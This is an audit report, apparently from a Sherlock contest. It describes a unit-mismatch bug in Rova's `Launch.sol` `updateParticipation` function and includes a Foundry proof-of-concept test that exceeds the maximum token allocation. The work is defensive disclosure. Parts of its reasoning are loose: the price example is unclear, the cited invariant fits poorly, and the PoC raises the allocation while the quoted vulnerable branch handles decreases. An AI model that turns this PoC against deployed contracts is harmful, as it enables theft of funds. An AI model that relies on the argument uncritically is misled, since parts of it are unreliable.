# Unit Mismatch in Token Accounting Leads to Allocation Limit Bypass

---
### **Summary and Impact**  

The `Launch.sol` contract contains a critical accounting error in the `updateParticipation` function where token allocations are incorrectly adjusted using currency amounts. This mismatch allows users to bypass core allocation limits defined in `LaunchGroupSettings`, directly violating the protocol's documented invariants.

Based on the project documentation stating "What properties/invariants do you want to hold even if breaking them has a low/unknown impact?" with the response "For a given payment currency, The total amount of payment currency tokens that can be withdrawn should equal the total amount of payment currency tokens funded for finalized token sale participations," this vulnerability fundamentally breaks that invariant.

The impact is severe because:
1. Users can exceed their maximum token allocation limits
2. Users can manipulate their recorded token amounts to fall below minimum thresholds while retaining more tokens
3. The total token accounting becomes unreliable, breaking the documented ratio between payment currency and tokens

### **Vulnerability Details**  

https://github.com/sherlock-audit/2025-02-rova/blob/main/rova-contracts/src/Launch.sol#L312

The issue occurs in the `updateParticipation` function where currency amounts are directly used to adjust token allocations:

```solidity
// In Launch.sol
if (prevInfo.currencyAmount > newCurrencyAmount) {
    uint256 refundCurrencyAmount = prevInfo.currencyAmount - newCurrencyAmount;
    userTokens.set(request.userId, userTokenAmount - refundCurrencyAmount); // VULNERABLE
}
```

This creates a mismatch because `userTokens` stores token amounts but is being modified with currency amounts. Consider this scenario:

1. Token price is set to 10000 bps (1 token = 100 currency units)
2. User has 1000 tokens (100,000 currency units)
3. User updates to 900 tokens (90,000 currency units)
4. Difference is 10,000 currency units
5. Code subtracts 10,000 from token amount instead of 100 tokens

Here's a proof of concept test demonstrating the vulnerability:

```solidity
function test_ExploitUnitMismatch_BypassMaxAllocation() public {
    // Set max token allocation to 2000 tokens
    uint256 maxTokens = 2000 * 10**launch.tokenDecimals();
    vm.startPrank(manager);
    settings.maxTokenAmountPerUser = maxTokens;
    launch.setLaunchGroupSettings(testLaunchGroupId, settings);
    vm.stopPrank();

    // Update to 3000 tokens (should fail but doesn't)
    UpdateParticipationRequest memory request = 
        _createUpdateParticipationRequest(3000);
    bytes memory signature = _signRequest(abi.encode(request));

    vm.startPrank(user1);
    currency.approve(address(launch), 
        _getCurrencyAmount(request.launchGroupId, 
        request.currency, request.tokenAmount));

    // This executes successfully despite exceeding max allocation
    launch.updateParticipation(request, signature);

    uint256 userTokens = launch.getUserTokensByLaunchGroup(
        testLaunchGroupId, testUserId);
    assertTrue(userTokens > maxTokens);
    vm.stopPrank();
}
```

This directly violates the protocol's configuration in `rova-contracts` where the documentation states: "Admin, manager, signer, and operator roles are trusted" - implying that role-based limits like max allocations should be strictly enforced.

### **Tools Used**  
- Manual Review
- Foundry

### **Recommendations**  

The fix requires proper unit conversion when adjusting token allocations. This ensures token allocations are adjusted using token amounts rather than currency amounts, maintaining the correct ratio between payment currency and tokens as specified in the protocol's invariants.
